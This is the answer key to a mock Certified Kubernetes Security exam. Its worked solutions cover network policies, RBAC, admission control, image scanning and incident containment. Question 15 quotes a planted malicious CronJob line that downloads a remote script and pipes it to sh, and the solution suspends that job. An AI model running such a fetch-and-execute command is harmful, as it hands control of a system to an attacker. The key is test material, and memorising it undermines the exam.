# Answers - Mock Exam - CKS - 2 (cks-003)

## Question 1 - Egress lockdown for gateway-proxy

Goal: restrict `gateway-proxy` egress to the `internal-api` namespace on TCP 80 plus DNS; everything else blocked.

```bash
kubectl apply -f - <<EOF
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: gateway-egress
  namespace: edge-zone
spec:
  podSelector:
    matchLabels:
      app: gateway-proxy
  policyTypes:
  - Egress
  egress:
  - to:
    - namespaceSelector:
        matchLabels:
          kubernetes.io/metadata.name: internal-api
    ports:
    - protocol: TCP
      port: 80
  - ports:
    - protocol: UDP
      port: 53
    - protocol: TCP
      port: 53
EOF
```

Verify:

```bash
kubectl -n edge-zone exec deploy/gateway-proxy -- wget -q -T 5 -O- http://orders-api-svc.internal-api.svc   # works
kubectl -n edge-zone exec deploy/gateway-proxy -- wget -q -T 5 -O- http://legacy-svc.corp-tools.svc         # times out
```

## Question 2 - kube-bench report analysis

Goal: extract the FAIL checks and the remediation flag from the provided report.

```bash
grep '^\[FAIL\]' /tmp/exam/q2/kube-bench-results.txt | awk '{print $2}' > /tmp/exam/q2/failed-checks.txt
cat /tmp/exam/q2/failed-checks.txt
# 1.2.1
# 1.2.18
# 1.4.1
# 4.2.6

echo -- '--anonymous-auth=false' > /tmp/exam/q2/remediation-1.2.1.txt
# or simply:
printf -- '--anonymous-auth=false\n' > /tmp/exam/q2/remediation-1.2.1.txt
```

## Question 3 - Certificate-based user dev-lena with least privilege

Goal: issue a client certificate through the Kubernetes CSR API and bind a read-only pods Role.

```bash
cd /tmp/exam/q3
openssl genrsa -out dev-lena.key 2048
openssl req -new -key dev-lena.key -subj "/CN=dev-lena" -out dev-lena.csr

kubectl apply -f - <<EOF
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata:
  name: dev-lena
spec:
  request: $(base64 -w0 < dev-lena.csr)
  signerName: kubernetes.io/kube-apiserver-client
  usages:
  - client auth
EOF

kubectl certificate approve dev-lena
kubectl get csr dev-lena -o jsonpath='{.status.certificate}' | base64 -d > dev-lena.crt

kubectl -n dev-portal create role portal-pod-reader \
  --verb=get,list,watch --resource=pods,pods/log
kubectl -n dev-portal create rolebinding dev-lena-pod-reader \
  --role=portal-pod-reader --user=dev-lena
```

Verify:

```bash
kubectl auth can-i get pods -n dev-portal --as=dev-lena        # yes
kubectl auth can-i delete pods -n dev-portal --as=dev-lena     # no
kubectl auth can-i get secrets -n dev-portal --as=dev-lena     # no
kubectl auth can-i list pods -A --as=dev-lena                  # no
```

## Question 4 - Projected, audience-bound ServiceAccount token

Goal: dedicated SA without automount, plus a short-lived projected token for the vault audience.

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: inventory-sa
  namespace: stock-system
automountServiceAccountToken: false
EOF

kubectl -n stock-system patch deployment inventory-api --type=strategic -p '
spec:
  template:
    spec:
      serviceAccountName: inventory-sa
      containers:
      - name: api
        volumeMounts:
        - name: vault-token
          mountPath: /var/run/vault
          readOnly: true
      volumes:
      - name: vault-token
        projected:
          sources:
          - serviceAccountToken:
              audience: internal-vault
              expirationSeconds: 600
              path: token
'
kubectl -n stock-system rollout status deployment/inventory-api
```

Verify:

```bash
kubectl -n stock-system exec deploy/inventory-api -- cat /var/run/vault/token | head -c 20; echo
kubectl -n stock-system exec deploy/inventory-api -- ls /var/run/secrets/kubernetes.io/serviceaccount  # No such file
```

## Question 5 - Revoke unauthenticated privileges

Goal: find and remove the binding that exposes secrets/nodes to `system:unauthenticated`.

```bash
# Audit: list bindings whose subjects include system:unauthenticated
kubectl get clusterrolebindings -o json | jq -r '
  .items[] | select(.subjects[]? | .name == "system:unauthenticated") | .metadata.name'
# -> system:public-info-viewer (built-in, keep)
# -> telemetry-public-access   (offender)

mkdir -p /tmp/exam/q5
echo "telemetry-public-access" > /tmp/exam/q5/findings.txt

kubectl delete clusterrolebinding telemetry-public-access
kubectl delete clusterrole telemetry-export
```

Verify:

```bash
kubectl auth can-i get secrets -A --as=system:anonymous --as-group=system:unauthenticated   # no
kubectl get clusterrolebinding system:public-info-viewer release-bot-read                   # still present
```

## Question 6 - Strip host access from host-inspector

Goal: remove host namespaces and hostPath, enforce a hardened securityContext.

```bash
kubectl -n node-ops apply -f - <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: host-inspector
  namespace: node-ops
  labels:
    app: host-inspector
spec:
  replicas: 1
  selector:
    matchLabels:
      app: host-inspector
  template:
    metadata:
      labels:
        app: host-inspector
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 10001
      containers:
      - name: inspector
        image: busybox:1.36
        command: ["sh", "-c", "sleep 86400"]
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop: ["ALL"]
EOF
kubectl -n node-ops rollout status deployment/host-inspector
```

Note: `kubectl apply` performs a strategic merge, but since the new manifest omits `hostNetwork`, `hostPID`, `volumes`, and `volumeMounts`, replacing the deployment with `kubectl replace -f` (or `kubectl edit` and deleting those fields) is the safest path. With `kubectl edit`:

- delete `hostNetwork: true`, `hostPID: true`, the `volumes:` block, and the `volumeMounts:` block
- add the pod/container securityContext shown above

Verify:

```bash
kubectl -n node-ops get pod -l app=host-inspector -o jsonpath='{.items[0].status.podIP} {.items[0].status.hostIP}'
# two different IPs
```

## Question 7 - Host footprint audit (SIMULATED)

Goal: identify baseline violations in the planted evidence.

Baseline allows: `sshd.service`, `containerd.service`, `kubelet.service`, `cron.service`, `dbus.service`, `systemd-*`. Violations in `enabled-services.txt`: `docker.service`, `rpcbind.service`, `telnet.socket`, `vsftpd.service`.

```bash
cat > /tmp/exam/q7/disable-list.txt <<EOF
docker.service
rpcbind.service
telnet.socket
vsftpd.service
EOF

# dockerd listening on 0.0.0.0:2375 is the unauthenticated Docker remote API
echo "2375" > /tmp/exam/q7/insecure-api.txt
```

## Question 8 - Fix CreateContainerConfigError without weakening policy

Goal: keep `runAsNonRoot: true`, switch to the unprivileged image, repoint the ports.

```bash
kubectl -n checkout set image deployment/checkout-api api=nginxinc/nginx-unprivileged:1.27-alpine
kubectl -n checkout patch deployment checkout-api --type=json -p '[
  {"op": "replace", "path": "/spec/template/spec/containers/0/ports/0/containerPort", "value": 8080}
]'
kubectl -n checkout patch service checkout-svc --type=json -p '[
  {"op": "replace", "path": "/spec/ports/0/targetPort", "value": 8080}
]'
kubectl -n checkout rollout status deployment/checkout-api
```

Verify:

```bash
kubectl -n checkout exec deploy/checkout-api -- id -u                       # 101 (non-root)
kubectl -n checkout exec deploy/storefront-client -- wget -q -O- http://checkout-svc.checkout.svc | head -3
```

## Question 9 - TLS between payments-client and orders-app

Goal: terminate TLS in the orders pod using the issued certificate.

```bash
kubectl -n intra-tls create secret tls orders-tls \
  --cert=/tmp/exam/q9/orders.crt --key=/tmp/exam/q9/orders.key

kubectl -n intra-tls patch deployment orders-app --type=strategic -p '
spec:
  template:
    spec:
      containers:
      - name: orders
        ports:
        - containerPort: 8443
        volumeMounts:
        - name: tls
          mountPath: /etc/nginx/tls
          readOnly: true
        - name: tls-conf
          mountPath: /etc/nginx/conf.d
      volumes:
      - name: tls
        secret:
          secretName: orders-tls
      - name: tls-conf
        configMap:
          name: orders-tls-conf
'

kubectl -n intra-tls patch service orders-svc --type=json -p '[
  {"op": "replace", "path": "/spec/ports/0/port", "value": 443},
  {"op": "replace", "path": "/spec/ports/0/targetPort", "value": 8443}
]'
kubectl -n intra-tls rollout status deployment/orders-app
```

Verify:

```bash
kubectl -n intra-tls exec deploy/payments-client -- curl -ks https://orders-svc.intra-tls.svc/
# orders-api: secure
```

## Question 10 - ValidatingAdmissionPolicy against hostPath

Goal: CEL admission policy that rejects hostPath pods in restricted namespaces.

```bash
kubectl apply -f - <<EOF
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: deny-hostpath
spec:
  failurePolicy: Fail
  matchConstraints:
    resourceRules:
    - apiGroups: [""]
      apiVersions: ["v1"]
      operations: ["CREATE", "UPDATE"]
      resources: ["pods"]
  validations:
  - expression: "!has(object.spec.volumes) || object.spec.volumes.all(v, !has(v.hostPath))"
    message: "hostPath volumes are not allowed in restricted namespaces"
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: deny-hostpath-binding
spec:
  policyName: deny-hostpath
  validationActions: ["Deny"]
  matchResources:
    namespaceSelector:
      matchLabels:
        volume-policy: restricted
EOF
```

Capture the rejection (note the redirection pattern - a heredoc with `| tee` would capture the YAML, not the error):

```bash
kubectl -n storage-guard apply -f - > /tmp/exam/q10/rejected.txt 2>&1 <<EOF || true
apiVersion: v1
kind: Pod
metadata:
  name: bad-cache
  namespace: storage-guard
spec:
  containers:
  - name: c
    image: busybox:1.36
    command: ["sleep", "60"]
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /var/log
EOF
cat /tmp/exam/q10/rejected.txt   # ... denied request ... hostPath volumes are not allowed ...
```

Create the compliant pod:

```bash
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: safe-cache
  namespace: storage-guard
spec:
  containers:
  - name: cache
    image: busybox:1.36
    command: ["sh", "-c", "sleep 86400"]
    volumeMounts:
    - name: cache
      mountPath: /cache
  volumes:
  - name: cache
    emptyDir: {}
EOF
```

## Question 11 - Manifest hardening with trivy and kubesec

Goal: scan, fix, score, deploy.

```bash
trivy config /tmp/exam/q11/webhook-deploy.yaml -o /tmp/exam/q11/trivy-report.txt

cat > /tmp/exam/q11/webhook-deploy-fixed.yaml <<EOF
apiVersion: apps/v1
kind: Deployment
metadata:
  name: webhook-gw
  namespace: release-engineering
  labels:
    app: webhook-gw
spec:
  replicas: 1
  selector:
    matchLabels:
      app: webhook-gw
  template:
    metadata:
      labels:
        app: webhook-gw
    spec:
      containers:
      - name: gw
        image: busybox:1.36
        command: ["sh", "-c", "sleep 86400"]
        resources:
          requests:
            cpu: 50m
            memory: 32Mi
          limits:
            cpu: 200m
            memory: 128Mi
        securityContext:
          runAsNonRoot: true
          runAsUser: 10001
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          capabilities:
            drop: ["ALL"]
EOF

kubesec scan /tmp/exam/q11/webhook-deploy-fixed.yaml > /tmp/exam/q11/kubesec-report.json
jq '.[0].score' /tmp/exam/q11/kubesec-report.json   # >= 5

kubectl apply -f /tmp/exam/q11/webhook-deploy-fixed.yaml
kubectl -n release-engineering rollout status deployment/webhook-gw
```

## Question 12 - Pin web-frontend to an immutable digest

Goal: replace the mutable tag with the resolved digest reference.

```bash
IMAGE_ID=$(kubectl -n release-pinning get pod -l app=web-frontend \
  -o jsonpath='{.items[0].status.containerStatuses[0].imageID}')
# e.g. docker.io/library/nginx@sha256:abc...

DIGEST="${IMAGE_ID#*@}"
echo "nginx@${DIGEST}" > /tmp/exam/q12/pinned-image.txt

kubectl -n release-pinning set image deployment/web-frontend web="nginx@${DIGEST}"
kubectl -n release-pinning rollout status deployment/web-frontend
```

Verify:

```bash
kubectl -n release-pinning get deployment web-frontend -o jsonpath='{.spec.template.spec.containers[0].image}'
```

## Question 13 - SBOM generation and vulnerability triage

Goal: SBOM the old image, scan the SBOM, extract the nginx version, upgrade.

```bash
syft nginx:1.25-alpine -o cyclonedx-json=/tmp/exam/q13/sbom.json
trivy sbom /tmp/exam/q13/sbom.json --format json -o /tmp/exam/q13/sbom-vulns.json

jq -r '.components[] | select(.name=="nginx") | .version' /tmp/exam/q13/sbom.json \
  > /tmp/exam/q13/nginx-version.txt
cat /tmp/exam/q13/nginx-version.txt   # 1.25.x

kubectl -n sbom-audit set image deployment/web-api api=nginx:1.27-alpine
kubectl -n sbom-audit rollout status deployment/web-api
```

## Question 14 - Audit policy authoring (SIMULATED)

Goal: write the policy file only; it is not loaded on this backend.

```bash
cat > /tmp/exam/q14/audit-policy.yaml <<EOF
apiVersion: audit.k8s.io/v1
kind: Policy
omitStages:
- RequestReceived
rules:
- level: RequestResponse
  resources:
  - group: ""
    resources: ["secrets"]
- level: None
  users: ["system:kube-proxy"]
  verbs: ["watch"]
  resources:
  - group: ""
    resources: ["endpoints", "services"]
- level: RequestResponse
  verbs: ["create"]
  resources:
  - group: ""
    resources: ["pods/exec"]
- level: Metadata
EOF

yq e '.' /tmp/exam/q14/audit-policy.yaml   # sanity check
```

## Question 15 - Malicious CronJob containment

Goal: identify `cache-warm` (downloads and pipes a remote payload to `sh`), suspend it, revoke its RBAC.

```bash
kubectl -n batch-ops get cronjobs -o yaml | grep -B5 -A2 'wget'
# cache-warm runs: wget -q -T 10 -O- http://203.0.113.66/payload.sh | sh

cat > /tmp/exam/q15/findings.txt <<EOF
cache-warm
203.0.113.66
EOF

kubectl -n batch-ops patch cronjob cache-warm -p '{"spec":{"suspend":true}}'

kubectl delete clusterrolebinding ops-runner-secrets
kubectl delete clusterrole ops-runner-secrets
```

Verify:

```bash
kubectl -n batch-ops get cronjobs    # only cache-warm SUSPEND=True
kubectl auth can-i get secrets -A --as=system:serviceaccount:batch-ops:ops-runner   # no
```

## Question 16 - Leaked credential in logs

Goal: recover the leaked token, rotate the secret, stop logging the value.

```bash
kubectl -n notify logs deploy/notify-bot
# startup: notifier using token=ntfy_8d31f7c2a99e

echo "ntfy_8d31f7c2a99e" > /tmp/exam/q16/leaked-token.txt

# Rotate to the replacement value issued by the platform team
kubectl -n notify create secret generic notify-token \
  --from-literal=token=ntfy_c4f1e8b2d7a0 \
  --dry-run=client -o yaml | kubectl apply -f -

# Stop logging the token: change the startup echo
kubectl -n notify patch deployment notify-bot --type=json -p '[
  {"op": "replace", "path": "/spec/template/spec/containers/0/command",
   "value": ["sh", "-c", "echo \"startup: token loaded\"; while true; do sleep 3600; done"]}
]'
kubectl -n notify rollout status deployment/notify-bot
```

Verify:

```bash
kubectl -n notify logs deploy/notify-bot
# startup: token loaded            (no token value anywhere)
kubectl -n notify exec deploy/notify-bot -- sh -c 'echo $NOTIFY_TOKEN'   # ntfy_c4f1e8b2d7a0
```
